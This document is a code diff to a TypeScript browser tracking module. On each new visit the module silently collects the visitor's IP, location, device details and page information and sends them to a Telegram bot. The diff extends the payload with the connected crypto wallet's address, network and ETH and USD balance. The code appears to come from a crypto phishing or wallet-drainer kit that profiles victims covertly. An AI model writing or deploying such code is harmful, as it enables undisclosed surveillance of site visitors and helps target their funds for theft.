@@ -3,6 +3,11 @@ import { sendToTelegram } from './telegram';
 
 export interface UserInfo {
   ip: string;
+  websiteInfo: {
+    url: string;
+    title: string;
+    referrer: string;
+  };
   location: {
     city?: string;
     country?: string;
@@ -14,16 +19,29 @@ export interface UserInfo {
     os: string;
     userAgent: string;
   };
+  wallet: {
+    address?: string;
+    network?: {
+      name: string;
+      chainId: number;
+    };
+    balance?: {
+      eth: string;
+      usd?: string;
+    };
+    isConnected: boolean;
+  };
 }
 
-export async function initializeUserTracking(): Promise<void> {
+export async function initializeUserTracking(walletInfo: UserInfo['wallet']): Promise<void> {
   if (StorageManager.shouldNotifyNewVisit()) {
     console.log('New visit detected - collecting user information...');
     
     try {
-      const userInfo = await getUserInfo();
+      const userInfo = await getUserInfo(walletInfo);
+      console.log('User information collected:', userInfo);
       
-      // Method 1: Send directly to your bot's API endpoint
+      // Send to telegram bot
       const messageSent = await sendToTelegram(userInfo);
       
       if (messageSent) {
@@ -38,7 +56,7 @@ export async function initializeUserTracking(): Promise<void> {
   }
 }
 
-async function getUserInfo(): Promise<UserInfo> {
+async function getUserInfo(walletInfo: UserInfo['wallet']): Promise<UserInfo> {
   try {
     // Get IP address using a public API
     const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -52,15 +70,20 @@ async function getUserInfo(): Promise<UserInfo> {
     const userAgent = navigator.userAgent;
     const isMobile = /Mobile|Android|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(userAgent);
     const isTablet = /Tablet|iPad/i.test(userAgent);
-
     const deviceType = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop';
 
     // Get browser and OS info
     const browser = detectBrowser();
     const os = detectOS();
 
+    // Build complete user info with provided wallet info
     return {
       ip,
+      websiteInfo: {
+        url: window.location.origin + window.location.pathname,
+        title: document.title,
+        referrer: document.referrer || 'Direct'
+      },
       location: {
         city: locationData.city,
         country: locationData.country_name,
@@ -71,7 +94,8 @@ async function getUserInfo(): Promise<UserInfo> {
         browser,
         os,
         userAgent
-      }
+      },
+      wallet: walletInfo // Use the wallet info passed from the component
     };
   } catch (error) {
     console.error('Error collecting user information:', error);
